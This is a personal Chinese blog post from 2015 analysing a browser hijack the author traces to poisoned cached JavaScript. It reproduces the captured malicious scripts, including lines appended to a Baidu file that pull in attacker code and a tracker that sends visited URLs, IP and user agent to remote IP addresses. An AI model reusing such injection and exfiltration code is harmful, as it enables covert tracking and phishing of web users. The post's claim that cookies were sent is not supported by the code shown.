---
layout: post
title:  "记一次被中间人攻击的经历"
date:   2015-11-01 18:15:26
comments: true
categories: Tech
---

俗话说得好，常在河边走，哪能不湿鞋？俗话又说了，出来混，早晚要还的。只是没想到自己还的这么快。就在之前的
几篇关于MITM的笔记兼科普文刚发布不久，我自己就遭遇了一次中间人攻击。无奈由于技不如人，当时花了两天都没
找到原因。不过吃一堑长一智，虽然丢了点个人信息，但总算明白了对方的手法。在此记录一下当时的排查过程，就当
是为自己作个提醒吧。


某天晚上我忙于搭建[我的github page][githubio]的时候，在某个网站下面突然发现有个巨大的广告弹窗，上面是一张扫地机
的图片。正好当时刚在淘宝上搜索过扫地机，对这种针对性广告也习以为常了，只是觉得这个弹窗有点大得诡异，不过当时
正弄网站弄得头脑兴奋，于是也没在意。

然后过了一两天，在浏览网页的时候，遇见那个扫地机弹窗的频率也越来越频繁，真正引起我的警惕的是，在访问一些朋友的
个人博客时，居然也有那个广告弹窗，而那个博客是肯定不会自己插入广告的。这时候我才意识到，我被黑了。由于技术水平
限制，我还一时不知道是什么问题。莫非是被中毒了？由于我平时用的是Linux操作系统，所以并没在安全防护方面花费
过多少心思，也许是被钻了漏洞，于是马上更新了最新版的浏览器，并且把操作系统的所有安全补丁也打上了。重启电脑之后
以为肯定没问题，结果一上网就发现了那个可恶的弹窗。于是想到也许是被劫持了，查看了ARP发现网关的MAC地址和我记录的地址
是一样的，然后查看DNS域名服务器：

    #cat /etc/resolv.conf

是上级NAT分配的域名服务器，似乎也没什么问题。于是先在浏览器上F12查看请求的详情，发现有几条奇怪的GET：

    GET http://122.114.61.38/adjs/ad.js?undefined
    GET http://211.149.216.27/fn_put/fishingnet2.jsp?siteID=2
    GET http://122.114.61.38/fishingnet/js2log?jsurl=http://211.149.216.27/fn_put/fishingnet2.jsp?siteID=2

    GET http://211.149.216.27/fn_put/put2.jsp?postfix=&siteID=2&isPC=false&accessUa=Mozilla/5.0%20(X11;%20Linux%20x86_64;%20rv:38.0)%20Gecko/20100101%20Firefox/38.0%20Iceweasel/38.3.0&accessIp=xx.xx.xx.xx&accessId=accessId_fnxxxxxxx&url=http%3A//iask.sina.com.cn/b/1mJivmlTavsb.html 

前面一条返回了广告弹窗的框架，并且嵌入到我正在浏览的窗口里。如果我点击了那个广告，就进入了一个钓鱼网站，至于我怎么知道的……
因为看第二条，它的名字就叫**fishingnet**。如果只是钓鱼那也算了，因为我不去咬钩就没事，可注意最后一条，居然把我的Cookie上传
到攻击者的服务器上了！真是相当恶毒啊，看样子已经不能说是恶作剧了。看看第一次GET得到的ad.js:
    
    {% highlight js %}
    /* 2014-06-20T16:23:49.295Z */!function(e,t){
    
     if("undefined" == typeof location_sign)
      {
            location_sign = 'none';
      }
    
    var myids = new Array();
    myids['jfhome'] = '0';
    myids['cdair'] = '1';
    myids['shtt2'] = '2';
    myids['cqair'] = '3';
    myids['xjair'] = '4';
    myids['dlair'] = '5';
    myids['qdair'] = '6';
    myids['bjcn'] = '7';
    var siteid = '-1';
    if(myids.hasOwnProperty(location_sign))
    {
            siteid = myids[location_sign];
    }
    
    if(location_sign=='jfhome')
    {
    	var js = document.createElement('script');
    	jsurl = "http://211.149.216.27:8080/fn_put/fishingnet2.jsp?siteID="+siteid;
    	js.setAttribute('src',jsurl);
    	document.body.appendChild(js);
    }
    else
    {
    	var js = document.createElement('script');
    	jsurl = "http://211.149.216.27/fn_put/fishingnet2.jsp?siteID="+siteid;
    	js.setAttribute('src',jsurl);
    	document.body.appendChild(js);
    
    	var js1 = document.createElement('script');
    	var mylog = "http://122.114.61.38/fishingnet/js2log?jsurl="+jsurl;
    	js1.setAttribute('src',mylog);
    	document.body.appendChild(js1);
    }
    }(window,document);
    {% endhighlight %}

第二条GET请求直接返回一个js函数：

    function isPC() {
        
        var flag = false;
        
        var userAgentInfo = 'curl/7.26.0';
        var Agents = ["Windows NT", "Macintosh"];    
        for (var v = 0; v < Agents.length; v++) {
            if (userAgentInfo.indexOf(Agents[v]) > 0) {
                flag = true;
                break;
            }
        }
        
        return flag;
    }
    var putting1 = function(){
        var accessId = '';
        if(window.localStorage){  
            if(typeof(localStorage.accessId_fn) == "undefined")
            {
               localStorage.accessId_fn = "accessId_fn"+new Date().getTime();
            }
            accessId = localStorage.accessId_fn;
        }
        var url = window.location.href;
        var accessIp = '116.236.107.222';
        var accessUa = 'curl/7.26.0';   
        if(top.location == location)
        {       
            var ajax_fn = 'http://211.149.216.27/fn_put/put2.jsp?postfix=&siteID=2&isPC='+isPC()+'&accessUa='+accessUa+'&accessIp='+accessIp+'&accessId='+accessId+'&url='+escape(url);
            var script = document.createElement("script");
            script.src =  ajax_fn;
            document.body.appendChild(script);
        }
    }
    if (typeof(isload_fn) == "undefined" || isload_fn==false) {
            var isload_fn = true;
            putting1();
    }

第三次GET没有返回，估计只是给服务器端的jsp传参，最后就是以同样的形式把我的浏览信息按照ajax\_fn的格式送给服务器了，很恶毒对不对？但这只是结果，从一开始请求
ad.js之后，一切就脱离正轨了，我们需要找到原因，就必须再往上，开启wireshark抓包，设置过滤条件为：

    http&&(ip.addr==122.114.61.38 || ip.addr==211.149.216.27)

看看结果：

![wireshark-fishing]({{site.baseurl}}/images/wireshark-fishing.png)

**baidu_c.js**是什么玩意，下载来看看：

    /*! Copyright 2015 Baidu Inc. All Rights Reserved. */
    ; (function() {
        var l = void 0,
        m = !0,
        o = null,
        s = !1;
        function v(e) {
            return function() {
                return e
            }
        }
        var E = {
            t1: +new Date,
            t2: 0,
            t3: 0,
            t4: 0
        },
        I = ["search!"],
        aa = 3,
        ma = "BAIDU_DUP2_replacement",
        na = "http://dup.baidustatic.com/painter/",
        ... //省略四千行
        })();

    var myDate = new Date();
    var tt = myDate.getFullYear() +"_"+ myDate.getMonth() +"_"+ myDate.getDate();
    document.write("<scr"+"ipt id = 'myscript' src='http://122.114.61.38/fishingnet/shtt2/baidu_h.js?"+tt+"'></scr"+"ipt>");

是个四千行左右的js脚本，开头有baidu的版权，注意最后三行，似乎是额外添加的。也就是说我本该请求一个真正的`baidu_c.js`，却被攻击者调包了。
调包之后的js直接用document.write给我添加了点内容，恩，**baidu_h.js**，下载看看：
    
	var myads = document.getElementsByName("my_adsense_kk");
	var ad_loc = "shtt2";
	var ad_src = "baidu_c";
	if(myads)
	{
		//console.log(myads);
		//alert(myads.length);
		//for(myaddiv in myads)
		//console.log(myads.length);
		for(var i = 0, l = myads.length; i < l; i++) 
		{
			//alert(myadframe.item);
			//console.log("mylog");
			//console.log(myads[i].id);
			var content="";
			murl=encodeURIComponent(window.location.href.toLowerCase());
			if(!myads[i].hasChildNodes())
			{
				iframe = document.createElement("iframe");
				iframe.setAttribute("id", "gad-iframe");
                		iframe.style.align = "center";

				if(myads[i].id.match(/300_250/i) == "300_250")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=300&ad_height=250&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "300px";
                			iframe.style.height = "250px";
					content="add";

				}
				if(myads[i].id.match(/728_90/i) == "728_90")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=728&ad_height=90&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "728px";
                			iframe.style.height = "90px";
					content="add";
				}
				if(myads[i].id.match(/336_280/i) == "336_280")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=336&ad_height=280&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "336px";
                			iframe.style.height = "280px";
					content="add";
				}
				if(myads[i].id.match(/960_90/i) == "960_90")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=960&ad_height=90&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "960px";
                			iframe.style.height = "90px";
					content="add";
				}
				if(myads[i].id.match(/1000_90/i) == "1000_90")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=1000&ad_height=90&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "1000px";
                			iframe.style.height = "90px";
					content="add";
				}
				if(myads[i].id.match(/200_200/i) == "200_200")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=200&ad_height=200&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "200px";
                			iframe.style.height = "2000px";
					content="add";
				}
				if(myads[i].id.match(/250_250/i) == "250_250")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=250&ad_height=250&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "250px";
                			iframe.style.height = "250px";
					content="add";
				}
				if(myads[i].id.match(/250_120/i) == "250_120")
				{
					iframe.src="http://122.114.61.38/fishingnet/ad.html?ad_width=250&ad_height=120&ad_src=baidu_c&ad_loc="+ad_loc+"&ad_from="+murl;
                			iframe.style.width = "250px";
                			iframe.style.height = "120px";
					content="add";
				}
				
				if(content)
				{
					myads[i].appendChild(iframe);
				}
			}
		}
	}

在这里给我加了个ad.html的frame子标签，至此从ad.html搞的手脚就全部应用到我的页面上了，
在wireshark找到上传cookie的地方，右键Follow TCP Stream：

![follow-fishing-stream]({{site.baseurl}}/images/follow-fishing-stream.png)
    
果然请求都是从ad.html发出的。

至此为止，攻击过程是清楚了，但是源头还是没解决。一开始访问网站的时候，为什么请求了一个假的`baidu_c.h`呢？经过查找类似病例，发现很有
可能是被**js缓存投毒**了，其基本原理是利用一些网站的个别缓存js很久不更新且缓存时间很长的事实，对其进行污染修改。从而导致受害者在浏览网站
的时候与执行攻击者插入的内容。因此把`.mozilla`目录下的cache全部清空，再打开浏览器上网，世界终于清净了。

### 后记

这次中招突如其来，如果不是弹窗太突兀，整个中间人攻击的过程还是相当隐秘的，其背后还好是个以钓鱼为目的的黑产链，若是单纯的监控或者做小手脚，
一般人根本无法察觉，真是细思恐极。而且这种攻击是基于缓存的行为，杀毒软件是无法检测到的。网络世界像黑暗森林一样野蛮无情，掌握点基本技能保
护自己还是很必要的。

[githubio]: http://pannzh.github.io
